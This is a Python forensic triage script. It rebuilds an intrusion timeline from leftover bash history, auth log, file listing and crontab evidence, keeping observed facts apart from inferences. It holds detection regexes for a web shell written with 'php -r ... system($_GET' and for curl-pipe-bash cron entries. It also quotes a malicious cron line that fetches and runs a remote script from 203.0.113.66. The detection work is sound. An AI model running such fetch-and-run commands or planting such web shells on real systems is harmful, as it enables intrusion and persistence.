"""Forensic triage over residual evidence after log cleanup.

Rebuilds the determinable timeline from bash_history / auth log / file listing,
marks which periods are missing, and keeps inferred conclusions (entry vector,
persistence, account) strictly separate from observed facts. Every conclusion
cites evidence as file + line number.

Usage: python triage.py [evidence_dir] [out_json]
"""

from __future__ import annotations

import json
import os
import re
import sys
from datetime import datetime, timezone

EPOCH_RE = re.compile(r"^#(\d+)\s*$")
AUTH_RE = re.compile(r"^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(.*)$")
FILES_RE = re.compile(r"^(\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2})\s+(\d+)\s+(\S+)\s+(.+)$")

# Commands in bash_history that are known day-to-day noise. Anything not
# matching a suspicious pattern AND not in this list is left unreported
# (conservative: we would rather under-report than flag benign work).
NOISE_COMMANDS = (
    "systemctl status", "ls -la", "git pull", "tail -f", "cd /var/log",
)

SUSPICIOUS_COMMANDS = [
    (re.compile(r"php\s+-r\s+.*system\(\$_GET"), "web shell written to disk via php -r"),
    (re.compile(r"^crontab\s+-e"), "crontab edited interactively"),
    (re.compile(r"^cd\s+/var/www/html/uploads"), "shell moved into web upload directory"),
]


def ref(file: str, line: int) -> dict:
    return {"file": file, "line": line}


def parse_bash_history(path: str, rel: str) -> tuple[list[dict], list[dict], list[int]]:
    """Return (suspicious_events, noise_info, all_epochs_seen)."""
    events: list[dict] = []
    noise = 0
    epochs: list[int] = []
    pending_ts: int | None = None
    pending_line = 0
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for no, raw in enumerate(fh, start=1):
            line = raw.strip()
            m = EPOCH_RE.match(line)
            if m:
                pending_ts = int(m.group(1))
                pending_line = no
                epochs.append(pending_ts)
                continue
            if not line:
                continue
            hit = next((desc for pat, desc in SUSPICIOUS_COMMANDS if pat.search(line)), None)
            if hit:
                events.append({
                    "time": datetime.fromtimestamp(pending_ts, timezone.utc).isoformat() if pending_ts else None,
                    "epoch": pending_ts,
                    "time_basis": "epoch (bash_history #timestamp, rendered as UTC)",
                    "event": f"{hit}: `{line}`",
                    "category": "bash",
                    "evidence": [ref(rel, no), ref(rel, pending_line)],
                })
            elif any(line.startswith(n) for n in NOISE_COMMANDS):
                noise += 1
            # unknown commands: neither reported as hits nor counted as noise
    return events, [{"noise_commands_suppressed": noise}], epochs


def parse_auth_log(path: str, rel: str) -> list[dict]:
    events: list[dict] = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for no, raw in enumerate(fh, start=1):
            line = raw.strip()
            m = AUTH_RE.match(line)
            if not m:
                continue
            ts, _host, msg = m.groups()
            if "POST /upload.php" in msg:
                event = "upload endpoint POSTed (web shell upload): " + msg
                cat = "web"
            elif re.search(r"GET\s+/uploads/shell\.php\?cmd=", msg):
                event = "web shell executed with cmd=id: " + msg
                cat = "web"
            else:
                continue  # routine ssh logins etc. are background, not reported
            events.append({
                "time": ts,
                "epoch": None,
                "time_basis": "auth log local clock (year/timezone not recorded)",
                "event": event,
                "category": cat,
                "evidence": [ref(rel, no)],
            })
    return events


def parse_files(path: str, rel: str) -> list[dict]:
    events: list[dict] = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for no, raw in enumerate(fh, start=1):
            m = FILES_RE.match(raw.strip())
            if not m:
                continue
            ts, mode, owner, fpath = m.groups()
            if fpath.endswith("uploads/shell.php"):
                event = f"shell.php present in web upload dir, owner={owner} mode={mode}"
            elif "crontabs/" in fpath:
                event = f"per-user crontab for {owner} modified (mode={mode})"
            else:
                continue
            events.append({
                "time": ts,
                "epoch": None,
                "time_basis": "file mtime from listing (timezone not recorded)",
                "event": event,
                "category": "file",
                "evidence": [ref(rel, no)],
            })
    return events


def parse_crontab(path: str, rel: str) -> list[dict]:
    events: list[dict] = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for no, raw in enumerate(fh, start=1):
            line = raw.strip()
            if re.search(r"curl\s+-s\s+http.*\|\s*bash", line):
                events.append({
                    "time": None,
                    "epoch": None,
                    "time_basis": "none (crontab content carries no timestamp)",
                    "event": f"malicious cron entry (curl|bash from 203.0.113.66): `{line}`",
                    "category": "cron",
                    "evidence": [ref(rel, no)],
                })
    return events


def build_report(root: str) -> dict:
    facts: list[dict] = []
    noise_info: list[dict] = []

    bh = os.path.join(root, "bash_history.txt")
    ev, noise, epochs = parse_bash_history(bh, "evidence/bash_history.txt")
    facts += ev
    noise_info += noise

    facts += parse_auth_log(os.path.join(root, "auth_excerpt.log"), "evidence/auth_excerpt.log")
    facts += parse_files(os.path.join(root, "files.txt"), "evidence/files.txt")
    facts += parse_crontab(os.path.join(root, "crontab.txt"), "evidence/crontab.txt")

    # Sort only what is honestly sortable: epoch-bearing events among themselves.
    facts.sort(key=lambda e: (e["epoch"] is None, e["epoch"] or 0, e["time"] or ""))

    # Gap boundaries come from ALL surviving records, not only suspicious ones.
    first_ts = (datetime.fromtimestamp(min(epochs), timezone.utc).isoformat()
                if epochs else None)
    last_ts = (datetime.fromtimestamp(max(epochs), timezone.utc).isoformat()
               if epochs else None)

    gaps = [
        {
            "period": f"everything before {first_ts}",
            "status": "missing",
            "basis": "earliest surviving record is bash_history.txt line 1 "
                     "(#1790792700); no evidence covers anything earlier",
            "evidence": [ref("evidence/bash_history.txt", 1)],
        },
        {
            "period": f"after {last_ts} (last shell command) while web activity continues",
            "status": "missing",
            "basis": "bash_history ends at #1790824347 (`crontab -e`), but the auth log "
                     "shows web-shell use at Oct 01 12:02 and an upload at 12:05 on its "
                     "own clock; no shell history covers that later window",
            "evidence": [ref("evidence/bash_history.txt", 55),
                         ref("evidence/auth_excerpt.log", 26),
                         ref("evidence/auth_excerpt.log", 27)],
        },
    ]

    inferences = [
        {
            "id": "entry_vector",
            "conclusion": "web shell upload",
            "confidence": "high",
            "depends_on_file_timestamps": False,
            "reasoning": "shell.php sits in the web upload directory owned by www-data "
                         "(the web-server account), the auth log records a POST to "
                         "/upload.php returning 200 with (shell.php), and a GET "
                         "/uploads/shell.php?cmd=id shows the shell being executed over "
                         "HTTP. Inference, not direct observation: the upload itself is "
                         "seen only in the log excerpt, not in a full access log.",
            "supporting_evidence": [ref("evidence/files.txt", 2),
                                    ref("evidence/auth_excerpt.log", 27),
                                    ref("evidence/auth_excerpt.log", 26)],
        },
        {
            "id": "persistence",
            "conclusion": "cron (per-user crontab of www-data)",
            "confidence": "high",
            "depends_on_file_timestamps": False,
            "reasoning": "www-data's crontab file was modified, its content contains "
                         "`*/5 * * * * curl -s http://203.0.113.66/x.sh | bash`, and "
                         "bash_history shows an interactive `crontab -e`. The cron line "
                         "itself is direct evidence; attributing its creation to the "
                         "attacker is inference.",
            "supporting_evidence": [ref("evidence/crontab.txt", 3),
                                    ref("evidence/files.txt", 3),
                                    ref("evidence/bash_history.txt", 56)],
        },
        {
            "id": "account",
            "conclusion": "www-data",
            "confidence": "high",
            "depends_on_file_timestamps": False,
            "reasoning": "both the web shell and the modified crontab are owned by "
                         "www-data, consistent with compromise through the web server.",
            "supporting_evidence": [ref("evidence/files.txt", 2),
                                    ref("evidence/files.txt", 3)],
        },
        {
            "id": "attack_sequence",
            "conclusion": "shell.php existed by 2026-10-01 02:08 and the www-data "
                          "crontab by 02:13 (file-listing clock); the interactive "
                          "shell commands rewriting shell.php and editing the crontab "
                          "came later, 03:10-03:12 UTC",
            "confidence": "medium",
            "depends_on_file_timestamps": True,
            "reasoning": "this ordering rests entirely on file mtimes in files.txt "
                         "versus epoch stamps in bash_history; the two clocks were "
                         "never synchronized on record, and files.txt may have been "
                         "captured before the 03:11 UTC shell commands ran.",
            "supporting_evidence": [ref("evidence/files.txt", 2),
                                    ref("evidence/files.txt", 3),
                                    ref("evidence/bash_history.txt", 53),
                                    ref("evidence/bash_history.txt", 55)],
        },
    ]

    hits = [{"file": r["file"], "line": r["line"],
             "text": e["event"][:80]}
            for e in facts for r in e["evidence"]]

    return {
        "hits": hits,  # backward-compatible with the old consumer/tests
        "clock_assumption": "each source uses its own clock; cross-source ordering "
                            "assumes synchronized clocks and is flagged as inference",
        "facts": facts,
        "gaps": gaps,
        "inferences": inferences,
        "noise": noise_info,
        "timestamp_dependent_conclusions": [
            i["id"] for i in inferences if i["depends_on_file_timestamps"]
        ],
    }


def main() -> int:
    root = sys.argv[1] if len(sys.argv) > 1 else "evidence"
    out = sys.argv[2] if len(sys.argv) > 2 else "timeline.json"
    report = build_report(root)
    with open(out, "w", encoding="utf-8") as fh:
        json.dump(report, fh, ensure_ascii=False, indent=2)
    print(f"{len(report['facts'])} facts, {len(report['gaps'])} gaps, "
          f"{len(report['inferences'])} inferences -> {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
